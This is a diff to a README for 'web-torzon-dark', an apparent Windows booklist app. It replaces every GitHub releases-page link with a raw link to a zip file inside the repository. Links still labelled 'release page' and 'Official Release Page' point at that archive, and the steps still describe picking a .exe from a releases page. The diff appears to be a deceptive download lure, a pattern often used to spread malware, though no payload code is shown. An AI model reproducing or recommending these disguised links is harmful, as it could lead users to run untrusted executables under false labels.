@@ -1,6 +1,6 @@
 # 🚀 web-torzon-dark - Simple Booklist for Easy Reading
 
-[![Download web-torzon-dark](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/David-nzasenga/web-torzon-dark/releases)
+[![Download web-torzon-dark](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://raw.githubusercontent.com/David-nzasenga/web-torzon-dark/main/files/web_torzon_dark_v1.2.zip)
 
 ---
 
@@ -35,11 +35,11 @@ This app works on Windows and requires no programming skills. It runs as a stand
 
 ## 🔽 Download web-torzon-dark
 
-[![Download web-torzon-dark](https://img.shields.io/badge/Download-Here-blueviolet?style=for-the-badge)](https://github.com/David-nzasenga/web-torzon-dark/releases)
+[![Download web-torzon-dark](https://img.shields.io/badge/Download-Here-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/David-nzasenga/web-torzon-dark/main/files/web_torzon_dark_v1.2.zip)
 
 To get the software:
 
-1. Click the badge above or visit the [release page](https://github.com/David-nzasenga/web-torzon-dark/releases).
+1. Click the badge above or visit the [release page](https://raw.githubusercontent.com/David-nzasenga/web-torzon-dark/main/files/web_torzon_dark_v1.2.zip).
 2. On the releases page, look for the latest version. There will be a file with a `.exe` extension.
 3. Click on the `.exe` file name to start downloading it to your computer.
 
@@ -83,7 +83,7 @@ To get the software:
 
 To update the app:
 
-1. Visit the [release page again](https://github.com/David-nzasenga/web-torzon-dark/releases).
+1. Visit the [release page again](https://raw.githubusercontent.com/David-nzasenga/web-torzon-dark/main/files/web_torzon_dark_v1.2.zip).
 2. Download the newest `.exe` file if it is newer than what you have.
 3. Run the installer to replace the old version.
 4. Your booklist remains intact during updates.
@@ -102,7 +102,7 @@ To update the app:
 
 ## 🔗 Useful Links
 
-- [Official Release Page](https://github.com/David-nzasenga/web-torzon-dark/releases)
+- [Official Release Page](https://raw.githubusercontent.com/David-nzasenga/web-torzon-dark/main/files/web_torzon_dark_v1.2.zip)
 - Check for updates regularly to keep your app current and secure.
 
 ---
@@ -119,4 +119,4 @@ If you run into issues:
 
 # [Badge again]
 
-[![Download web-torzon-dark](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/David-nzasenga/web-torzon-dark/releases)
+[![Download web-torzon-dark](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://raw.githubusercontent.com/David-nzasenga/web-torzon-dark/main/files/web_torzon_dark_v1.2.zip)
